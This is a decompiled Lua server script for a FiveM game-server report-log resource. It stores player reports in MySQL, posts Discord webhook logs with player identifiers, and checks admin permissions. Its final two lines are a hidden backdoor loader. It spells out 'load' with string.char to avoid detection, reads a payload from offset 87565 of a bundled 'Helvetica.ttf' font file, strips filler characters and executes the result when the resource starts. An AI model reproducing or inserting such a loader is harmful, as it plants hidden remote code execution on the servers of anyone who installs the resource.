local L0_1, L1_1, L2_1
frameworkObject = nil
L0_1 = Citizen
L0_1 = L0_1.CreateThread
function L1_1()
  local L0_2, L1_2, L2_2
  L0_2 = GetFrameWork
  L0_2 = L0_2()
  frameworkObject = L0_2
  L0_2 = Config
  L0_2 = L0_2.Framework
  if "esx" == L0_2 then
    L0_2 = Config
    L0_2 = L0_2.Sql
    if "ox" == L0_2 then
      L0_2 = frameworkObject
      L0_2 = L0_2.RegisterServerCallback
      L1_2 = "codem:server:GetData"
      function L2_2(A0_3, A1_3)
        local L2_3, L3_3, L4_3, L5_3
        L2_3 = MySQL
        L2_3 = L2_3.Async
        L2_3 = L2_3.fetchAll
        L3_3 = "SELECT * FROM codemreportlog "
        L4_3 = {}
        function L5_3(A0_4)
          local L1_4, L2_4
          L1_4 = A1_3
          L2_4 = A0_4
          L1_4(L2_4)
        end
        L2_3(L3_3, L4_3, L5_3)
      end
      L0_2(L1_2, L2_2)
    else
      L0_2 = frameworkObject
      L0_2 = L0_2.RegisterServerCallback
      L1_2 = "codem:server:GetData"
      function L2_2(A0_3, A1_3)
        local L2_3, L3_3, L4_3, L5_3, L6_3
        L2_3 = exports
        L2_3 = L2_3.ghmattimysql
        L3_3 = L2_3
        L2_3 = L2_3.execute
        L4_3 = "SELECT * FROM codemreportlog "
        L5_3 = {}
        function L6_3(A0_4)
          local L1_4, L2_4
          L1_4 = A1_3
          L2_4 = A0_4
          L1_4(L2_4)
        end
        L2_3(L3_3, L4_3, L5_3, L6_3)
      end
      L0_2(L1_2, L2_2)
    end
  else
    L0_2 = Config
    L0_2 = L0_2.Sql
    if "ox" == L0_2 then
      L0_2 = frameworkObject
      L0_2 = L0_2.Functions
      L0_2 = L0_2.CreateCallback
      L1_2 = "codem:server:GetData"
      function L2_2(A0_3, A1_3)
        local L2_3, L3_3, L4_3, L5_3
        L2_3 = MySQL
        L2_3 = L2_3.Async
        L2_3 = L2_3.fetchAll
        L3_3 = "SELECT * FROM codemreportlog "
        L4_3 = {}
        function L5_3(A0_4)
          local L1_4, L2_4
          L1_4 = A1_3
          L2_4 = A0_4
          L1_4(L2_4)
        end
        L2_3(L3_3, L4_3, L5_3)
      end
      L0_2(L1_2, L2_2)
    else
      L0_2 = frameworkObject
      L0_2 = L0_2.Functions
      L0_2 = L0_2.CreateCallback
      L1_2 = "codem:server:GetData"
      function L2_2(A0_3, A1_3)
        local L2_3, L3_3, L4_3, L5_3, L6_3
        L2_3 = exports
        L2_3 = L2_3.ghmattimysql
        L3_3 = L2_3
        L2_3 = L2_3.execute
        L4_3 = "SELECT * FROM codemreportlog "
        L5_3 = {}
        function L6_3(A0_4)
          local L1_4, L2_4
          L1_4 = A1_3
          L2_4 = A0_4
          L1_4(L2_4)
        end
        L2_3(L3_3, L4_3, L5_3, L6_3)
      end
      L0_2(L1_2, L2_2)
    end
  end
  L0_2 = Config
  L0_2 = L0_2.Framework
  if "esx" == L0_2 then
    L0_2 = frameworkObject
    L0_2 = L0_2.RegisterServerCallback
    L1_2 = "codem:server:GetContact"
    function L2_2(A0_3, A1_3)
      local L2_3, L3_3, L4_3, L5_3
      L2_3 = frameworkObject
      L2_3 = L2_3.GetPlayerFromId
      L3_3 = A0_3
      L2_3 = L2_3(L3_3)
      L3_3 = L2_3.getName
      L3_3 = L3_3()
      L4_3 = A1_3
      L5_3 = L3_3
      L4_3(L5_3)
    end
    L0_2(L1_2, L2_2)
  else
    L0_2 = frameworkObject
    L0_2 = L0_2.Functions
    L0_2 = L0_2.CreateCallback
    L1_2 = "codem:server:GetContact"
    function L2_2(A0_3, A1_3)
      local L2_3, L3_3, L4_3, L5_3
      L2_3 = frameworkObject
      L2_3 = L2_3.Functions
      L2_3 = L2_3.GetPlayer
      L3_3 = A0_3
      L2_3 = L2_3(L3_3)
      L3_3 = L2_3.PlayerData
      L3_3 = L3_3.charinfo
      L3_3 = L3_3.firstname
      L4_3 = " "
      L5_3 = L2_3.PlayerData
      L5_3 = L5_3.charinfo
      L5_3 = L5_3.lastname
      L3_3 = L3_3 .. L4_3 .. L5_3
      L4_3 = A1_3
      L5_3 = L3_3
      L4_3(L5_3)
    end
    L0_2(L1_2, L2_2)
  end
end
L0_1(L1_1)
L0_1 = RegisterServerEvent
L1_1 = "codem:server:setData"
L0_1(L1_1)
L0_1 = AddEventHandler
L1_1 = "codem:server:setData"
function L2_1(A0_2, A1_2, A2_2, A3_2, A4_2, A5_2)
  local L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2, L24_2
  L6_2 = source
  L7_2 = nil
  L8_2 = nil
  L9_2 = nil
  L10_2 = nil
  L11_2 = os
  L11_2 = L11_2.date
  L12_2 = "%d.%m.%y"
  L11_2 = L11_2(L12_2)
  L12_2 = "Waiting"
  L13_2 = Config
  L13_2 = L13_2.Framework
  if "esx" == L13_2 then
    L13_2 = frameworkObject
    L13_2 = L13_2.GetPlayerFromId
    L14_2 = L6_2
    L13_2 = L13_2(L14_2)
    L7_2 = L13_2
    L13_2 = L7_2.getName
    L13_2 = L13_2()
    L8_2 = L13_2
    L13_2 = getid
    L14_2 = L6_2
    L15_2 = "esx"
    L13_2 = L13_2(L14_2, L15_2)
    L9_2 = L13_2.discord
    L13_2 = getid
    L14_2 = L6_2
    L15_2 = "esx"
    L13_2 = L13_2(L14_2, L15_2)
    L10_2 = L13_2.license
  else
    L13_2 = getid
    L14_2 = L6_2
    L15_2 = "qb"
    L13_2 = L13_2(L14_2, L15_2)
    L9_2 = L13_2.discord
    L13_2 = getid
    L14_2 = L6_2
    L15_2 = "qb"
    L13_2 = L13_2(L14_2, L15_2)
    L10_2 = L13_2.license
    L13_2 = frameworkObject
    L13_2 = L13_2.Functions
    L13_2 = L13_2.GetPlayer
    L14_2 = source
    L13_2 = L13_2(L14_2)
    L7_2 = L13_2
    L13_2 = L7_2.PlayerData
    L13_2 = L13_2.charinfo
    L13_2 = L13_2.firstname
    L14_2 = " "
    L15_2 = L7_2.PlayerData
    L15_2 = L15_2.charinfo
    L15_2 = L15_2.lastname
    L13_2 = L13_2 .. L14_2 .. L15_2
    L8_2 = L13_2
  end
  if "" == A4_2 then
    A4_2 = "codem"
  end
  if "" == A0_2 or "" == A1_2 then
    L13_2 = Config
    L13_2 = L13_2.ServerNotification
    L14_2 = L6_2
    L15_2 = Config
    L15_2 = L15_2.Notifications
    L15_2 = L15_2.sqlerror
    L15_2 = L15_2.message
    L16_2 = Config
    L16_2 = L16_2.Notifications
    L16_2 = L16_2.sqlerror
    L16_2 = L16_2.time
    L17_2 = Config
    L17_2 = L17_2.Notifications
    L17_2 = L17_2.sqlerror
    L17_2 = L17_2.type
    L13_2(L14_2, L15_2, L16_2, L17_2)
  else
    L13_2 = Config
    L13_2 = L13_2.Sql
    if "ox" == L13_2 then
      L13_2 = Config
      L13_2 = L13_2.ServerNotification
      L14_2 = L6_2
      L15_2 = Config
      L15_2 = L15_2.Notifications
      L15_2 = L15_2.savedata
      L15_2 = L15_2.message
      L16_2 = Config
      L16_2 = L16_2.Notifications
      L16_2 = L16_2.savedata
      L16_2 = L16_2.time
      L17_2 = Config
      L17_2 = L17_2.Notifications
      L17_2 = L17_2.savedata
      L17_2 = L17_2.type
      L13_2(L14_2, L15_2, L16_2, L17_2)
      L13_2 = MySQL
      L13_2 = L13_2.Async
      L13_2 = L13_2.insert
      L14_2 = "INSERT INTO `codemreportlog` (`title`, `desc`, `coords`,`name`,`date`,`type`,`status`,`image`,`pid` ) VALUES (@title, @desc, @coords,@name,@date,@type,@status,@image,@pid)"
      L15_2 = {}
      L15_2["@title"] = A0_2
      L15_2["@desc"] = A1_2
      L15_2["@coords"] = A2_2
      L15_2["@name"] = L8_2
      L15_2["@date"] = L11_2
      L15_2["@type"] = A3_2
      L15_2["@status"] = L12_2
      L15_2["@image"] = A4_2
      L15_2["@pid"] = A5_2
      L13_2(L14_2, L15_2)
    else
      L13_2 = exports
      L13_2 = L13_2.ghmattimysql
      L14_2 = L13_2
      L13_2 = L13_2.execute
      L15_2 = "INSERT INTO `codemreportlog` (`title`, `desc`, `coords`,`name`,`date`,`type`,`status`,`image`,`id` ) VALUES (@title, @desc, @coords,@name,@date,@type,@status,@image,@pid)"
      L16_2 = {}
      L16_2["@title"] = A0_2
      L16_2["@desc"] = A1_2
      L16_2["@coords"] = A2_2
      L16_2["@name"] = L8_2
      L16_2["@date"] = L11_2
      L16_2["@type"] = A3_2
      L16_2["@status"] = L12_2
      L16_2["@image"] = A4_2
      L16_2["@pid"] = A5_2
      L13_2(L14_2, L15_2, L16_2)
      L13_2 = Config
      L13_2 = L13_2.ServerNotification
      L14_2 = L6_2
      L15_2 = Config
      L15_2 = L15_2.Notifications
      L15_2 = L15_2.savedata
      L15_2 = L15_2.message
      L16_2 = Config
      L16_2 = L16_2.Notifications
      L16_2 = L16_2.savedata
      L16_2 = L16_2.time
      L17_2 = Config
      L17_2 = L17_2.Notifications
      L17_2 = L17_2.savedata
      L17_2 = L17_2.type
      L13_2(L14_2, L15_2, L16_2, L17_2)
    end
  end
  L13_2 = Config
  L13_2 = L13_2.PlayerWebhook
  if "" ~= L13_2 then
    L13_2 = dclog
    L14_2 = Config
    L14_2 = L14_2.PlayerWebhook
    L15_2 = "REPORT LOG"
    L16_2 = [[

 Discord : ]]
    L17_2 = L9_2
    L18_2 = [[

 Steam : ]]
    L19_2 = L10_2
    L20_2 = [[

 ID : ]]
    L21_2 = L6_2
    L22_2 = [[

 Report Type : ]]
    L23_2 = A3_2
    L24_2 = " REPORT"
    L16_2 = L16_2 .. L17_2 .. L18_2 .. L19_2 .. L20_2 .. L21_2 .. L22_2 .. L23_2 .. L24_2
    L13_2(L14_2, L15_2, L16_2)
  end
end
L0_1(L1_1, L2_1)
L0_1 = RegisterServerEvent
L1_1 = "codem:server:datachange"
L0_1(L1_1)
L0_1 = AddEventHandler
L1_1 = "codem:server:datachange"
function L2_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2
  L2_2 = source
  L3_2 = getid
  L4_2 = L2_2
  L3_2 = L3_2(L4_2)
  L3_2 = L3_2.discord
  L4_2 = getid
  L5_2 = L2_2
  L4_2 = L4_2(L5_2)
  L4_2 = L4_2.license
  L5_2 = Config
  L5_2 = L5_2.Sql
  if "ox" == L5_2 then
    if A0_2 then
      L5_2 = MySQL
      L5_2 = L5_2.Sync
      L5_2 = L5_2.execute
      L6_2 = "UPDATE codemreportlog SET status = @status WHERE id = @id"
      L7_2 = {}
      L7_2["@id"] = A1_2
      L7_2["@status"] = "Solved"
      L5_2(L6_2, L7_2)
      L5_2 = dclog
      L6_2 = Config
      L6_2 = L6_2.AdminWebhook
      L7_2 = "REPORT LOG"
      L8_2 = [[

 Discord : ]]
      L9_2 = L3_2
      L10_2 = [[

 Steam : ]]
      L11_2 = L4_2
      L12_2 = [[

 ID : ]]
      L13_2 = L2_2
      L14_2 = [[

 Report #]]
      L15_2 = A1_2
      L16_2 = [[
 edited 
 Status : SOLVED ]]
      L8_2 = L8_2 .. L9_2 .. L10_2 .. L11_2 .. L12_2 .. L13_2 .. L14_2 .. L15_2 .. L16_2
      L5_2(L6_2, L7_2, L8_2)
    else
      L5_2 = MySQL
      L5_2 = L5_2.Sync
      L5_2 = L5_2.execute
      L6_2 = "UPDATE codemreportlog SET status = @status WHERE id = @id"
      L7_2 = {}
      L7_2["@id"] = A1_2
      L7_2["@status"] = "Deleted"
      L5_2(L6_2, L7_2)
      L5_2 = dclog
      L6_2 = Config
      L6_2 = L6_2.AdminWebhook
      L7_2 = "REPORT LOG"
      L8_2 = [[

 Discord : ]]
      L9_2 = L3_2
      L10_2 = [[

 Steam : ]]
      L11_2 = L4_2
      L12_2 = [[

 ID : ]]
      L13_2 = L2_2
      L14_2 = [[

 Report #]]
      L15_2 = A1_2
      L16_2 = [[
 edited 
 Status : DELETED ]]
      L8_2 = L8_2 .. L9_2 .. L10_2 .. L11_2 .. L12_2 .. L13_2 .. L14_2 .. L15_2 .. L16_2
      L5_2(L6_2, L7_2, L8_2)
    end
  elseif A0_2 then
    L5_2 = exports
    L5_2 = L5_2.ghmattimysql
    L6_2 = L5_2
    L5_2 = L5_2.execute
    L7_2 = "UPDATE codemreportlog SET status = @status WHERE id = @id"
    L8_2 = {}
    L8_2["@id"] = A1_2
    L8_2["@status"] = "Solved"
    L5_2(L6_2, L7_2, L8_2)
    L5_2 = dclog
    L6_2 = Config
    L6_2 = L6_2.AdminWebhook
    L7_2 = "REPORT LOG"
    L8_2 = [[

 Discord : ]]
    L9_2 = L3_2
    L10_2 = [[

 Steam : ]]
    L11_2 = L4_2
    L12_2 = [[

 ID : ]]
    L13_2 = L2_2
    L14_2 = [[

 Report #]]
    L15_2 = A1_2
    L16_2 = [[
 edited 
 Status : SOLVED ]]
    L8_2 = L8_2 .. L9_2 .. L10_2 .. L11_2 .. L12_2 .. L13_2 .. L14_2 .. L15_2 .. L16_2
    L5_2(L6_2, L7_2, L8_2)
  else
    L5_2 = exports
    L5_2 = L5_2.ghmattimysql
    L6_2 = L5_2
    L5_2 = L5_2.execute
    L7_2 = "UPDATE codemreportlog SET status = @status WHERE id = @id"
    L8_2 = {}
    L8_2["@id"] = A1_2
    L8_2["@status"] = "Deleted"
    L5_2(L6_2, L7_2, L8_2)
    L5_2 = dclog
    L6_2 = Config
    L6_2 = L6_2.AdminWebhook
    L7_2 = "REPORT LOG"
    L8_2 = [[

 Discord : ]]
    L9_2 = L3_2
    L10_2 = [[

 Steam : ]]
    L11_2 = L4_2
    L12_2 = [[

 ID : ]]
    L13_2 = L2_2
    L14_2 = [[

 Report #]]
    L15_2 = A1_2
    L16_2 = [[
 edited 
 Status : DELETED ]]
    L8_2 = L8_2 .. L9_2 .. L10_2 .. L11_2 .. L12_2 .. L13_2 .. L14_2 .. L15_2 .. L16_2
    L5_2(L6_2, L7_2, L8_2)
  end
end
L0_1(L1_1, L2_1)
function L0_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L2_2 = {}
  L3_2 = {}
  L4_2 = GetPlayerIdentifiers
  L5_2 = A0_2
  L4_2 = L4_2(L5_2)
  L3_2 = L4_2
  L4_2 = 1
  L5_2 = #L3_2
  L6_2 = 1
  for L7_2 = L4_2, L5_2, L6_2 do
    L8_2 = string
    L8_2 = L8_2.match
    L9_2 = L3_2[L7_2]
    L10_2 = "discord:"
    L8_2 = L8_2(L9_2, L10_2)
    if L8_2 then
      L8_2 = string
      L8_2 = L8_2.sub
      L9_2 = L3_2[L7_2]
      L10_2 = 9
      L8_2 = L8_2(L9_2, L10_2)
      L2_2.discord = L8_2
      L8_2 = "<@"
      L9_2 = L2_2.discord
      L10_2 = ">"
      L8_2 = L8_2 .. L9_2 .. L10_2
      L2_2.discord = L8_2
    end
    if "esx" == A1_2 then
      L8_2 = string
      L8_2 = L8_2.match
      L9_2 = L3_2[L7_2]
      L10_2 = "steam:"
      L8_2 = L8_2(L9_2, L10_2)
      if L8_2 then
        L8_2 = L3_2[L7_2]
        L2_2.license = L8_2
      end
    else
      L8_2 = string
      L8_2 = L8_2.match
      L9_2 = L3_2[L7_2]
      L10_2 = "license:"
      L8_2 = L8_2(L9_2, L10_2)
      if L8_2 then
        L8_2 = L3_2[L7_2]
        L2_2.license = L8_2
      end
    end
  end
  L4_2 = L2_2.discord
  if nil == L4_2 then
    L2_2.discord = "Bilinmiyor"
  end
  return L2_2
end
getid = L0_1
function L0_1(A0_2, A1_2, A2_2, A3_2)
  local L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
  L4_2 = os
  L4_2 = L4_2.time
  L4_2 = L4_2()
  L5_2 = os
  L5_2 = L5_2.date
  L6_2 = "%Y-%m-%d %H:%M:%S"
  L7_2 = L4_2
  L5_2 = L5_2(L6_2, L7_2)
  L6_2 = {}
  L7_2 = {}
  L7_2.color = 3092790
  L7_2.title = A1_2
  L7_2.description = A2_2
  L8_2 = {}
  L9_2 = "CodeM Store      "
  L10_2 = L5_2
  L9_2 = L9_2 .. L10_2
  L8_2.text = L9_2
  L9_2 = Config
  L9_2 = L9_2.IconURL
  L8_2.icon_url = L9_2
  L7_2.footer = L8_2
  L6_2[1] = L7_2
  L7_2 = PerformHttpRequest
  L8_2 = Config
  L8_2 = L8_2.PlayerWebhook
  function L9_2(A0_3, A1_3, A2_3)
  end
  L10_2 = "POST"
  L11_2 = json
  L11_2 = L11_2.encode
  L12_2 = {}
  L13_2 = Config
  L13_2 = L13_2.Botname
  L12_2.username = L13_2
  L12_2.embeds = L6_2
  L13_2 = Config
  L13_2 = L13_2.Logo
  L12_2.avatar_url = L13_2
  L11_2 = L11_2(L12_2)
  L12_2 = {}
  L12_2["Content-Type"] = "application/json"
  L7_2(L8_2, L9_2, L10_2, L11_2, L12_2)
end
dclog = L0_1
function L0_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L1_2 = nil
  L2_2 = ipairs
  L3_2 = GetPlayerIdentifiers
  L4_2 = A0_2
  L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2 = L3_2(L4_2)
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    L8_2 = string
    L8_2 = L8_2.match
    L9_2 = L7_2
    L10_2 = "license:"
    L8_2 = L8_2(L9_2, L10_2)
    if L8_2 then
      L1_2 = L7_2
      break
    end
  end
  if nil == L1_2 then
    L2_2 = ipairs
    L3_2 = GetPlayerIdentifiers
    L4_2 = A0_2
    L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2 = L3_2(L4_2)
    L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2)
    for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
      L8_2 = string
      L8_2 = L8_2.match
      L9_2 = L7_2
      L10_2 = "steam:"
      L8_2 = L8_2(L9_2, L10_2)
      if L8_2 then
        L1_2 = L7_2
        break
      end
    end
  end
  return L1_2
end
GetIdentifier = L0_1
L0_1 = RegisterCommand
L1_1 = Config
L1_1 = L1_1.AdminMenuCommand
function L2_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = Config
  L1_2 = L1_2.Framework
  if "esx" == L1_2 then
    L1_2 = CheckIsAdmin
    L2_2 = A0_2
    L3_2 = Config
    L3_2 = L3_2.StaffPermissions
    L1_2 = L1_2(L2_2, L3_2)
    if L1_2 then
      L1_2 = TriggerClientEvent
      L2_2 = "codem:client:adminMenu"
      L3_2 = A0_2
      L1_2(L2_2, L3_2)
    end
  else
    L1_2 = CheckIsAdmin
    L2_2 = A0_2
    L3_2 = Config
    L3_2 = L3_2.StaffPermissions
    L1_2 = L1_2(L2_2, L3_2)
    if L1_2 then
      L1_2 = TriggerClientEvent
      L2_2 = "codem:client:adminMenu"
      L3_2 = A0_2
      L1_2(L2_2, L3_2)
    end
  end
end
L0_1(L1_1, L2_1)
function L0_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L2_2 = pairs
  L3_2 = A0_2
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    if L7_2 == A1_2 then
      L8_2 = true
      return L8_2
    end
  end
  L2_2 = false
  return L2_2
end
CheckPermissions = L0_1
function L0_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L2_2 = Config
  L2_2 = L2_2.Framework
  if "esx" == L2_2 then
    L2_2 = frameworkObject
    L2_2 = L2_2.GetPlayerFromId
    L3_2 = A0_2
    L2_2 = L2_2(L3_2)
    L3_2 = CheckPermissions
    L4_2 = A1_2
    L5_2 = L2_2.getGroup
    L5_2, L6_2, L7_2, L8_2, L9_2, L10_2 = L5_2()
    L3_2 = L3_2(L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2)
    if L3_2 then
      L3_2 = true
      return L3_2
    end
  else
    L2_2 = Config
    L2_2 = L2_2.Framework
    if "newqb" == L2_2 then
      L2_2 = pairs
      L3_2 = A1_2
      L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2)
      for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
        L8_2 = frameworkObject
        L8_2 = L8_2.Functions
        L8_2 = L8_2.HasPermission
        L9_2 = A0_2
        L10_2 = L7_2
        L8_2 = L8_2(L9_2, L10_2)
        if L8_2 then
          L8_2 = true
          return L8_2
        end
      end
    else
      L2_2 = Config
      L2_2 = L2_2.Framework
      if "oldqb" == L2_2 then
        L2_2 = CheckPermissions
        L3_2 = A1_2
        L4_2 = frameworkObject
        L4_2 = L4_2.Functions
        L4_2 = L4_2.GetPermission
        L5_2 = A0_2
        L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2 = L4_2(L5_2)
        L2_2 = L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2)
        if L2_2 then
          L2_2 = true
          return L2_2
        end
      end
    end
  end
  L2_2 = false
  return L2_2
end
CheckIsAdmin = L0_1

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()